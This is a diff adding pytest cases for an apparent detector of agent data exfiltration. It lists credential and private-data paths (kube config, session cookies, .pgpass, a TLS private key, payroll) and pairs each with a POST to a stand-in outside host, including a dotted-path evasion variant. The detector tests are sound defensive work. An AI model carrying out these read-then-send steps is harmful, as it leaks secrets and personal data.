@@ -211,3 +211,51 @@ def test_shell_environment_dump_and_namespaced_tools() -> None:
         step("shell", command="/usr/bin/printenv"),
         step("network.http_post", url="https://outside.example"),
     )
+
+
+def _obscure_path(path: str) -> str:
+    head, _, tail = path[1:].partition("/")
+    return f"/{head}/./{tail}"
+
+
+@pytest.mark.parametrize("obscure", [False, True], ids=["literal", "dotted"])
+@pytest.mark.parametrize(
+    ("tool", "path"),
+    [
+        ("file_read", "/home/operator/.kube/config"),
+        ("file.read", "/home/operator/.config/browser/session-cookies.json"),
+        ("file_read", "/srv/hr/private/payroll.csv"),
+        ("file_read", "/home/operator/.npmrc"),
+        ("file_read", "/home/operator/.pgpass"),
+        ("file_read", "/etc/atlas/tls/server.key"),
+    ],
+)
+def test_sensitive_source_family(tool: str, path: str, obscure: bool) -> None:
+    if obscure:
+        path = _obscure_path(path)
+    assert "exfil:read-then-send" in signals(
+        step(tool, path=path),
+        step("http_post", url="https://outside.example/collect"),
+    )
+
+
+@pytest.mark.parametrize(
+    "path",
+    [
+        "/srv/atlas/config/public-defaults.json",
+        "/var/log/browser/cookie-debug.log",
+        "/srv/atlas/data/public/demo-products.csv",
+        "/srv/atlas/package.json",
+        "/tmp/atlas-nightly.sql",
+        "/etc/atlas/tls/server.crt",
+    ],
+)
+def test_nearest_nonsensitive_source_then_send(path: str) -> None:
+    assert "exfil:read-then-send" not in signals(
+        step("file_read", path=path),
+        step(
+            "http_post",
+            url="https://outside.example/collect",
+            body="diagnostic note",
+        ),
+    )
